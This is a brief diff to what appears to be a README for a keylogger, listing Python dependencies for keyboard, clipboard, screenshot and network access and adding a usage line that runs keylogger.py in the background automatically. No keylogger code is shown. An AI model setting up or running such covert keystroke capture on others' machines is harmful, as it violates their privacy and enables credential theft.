@@ -14,3 +14,5 @@
 ## Installation
 1. Install dependencies:
 pip install pynput cryptography pillow pyperclip requests
+Usage:
+python3 keylogger.py  # Runs in background automatically
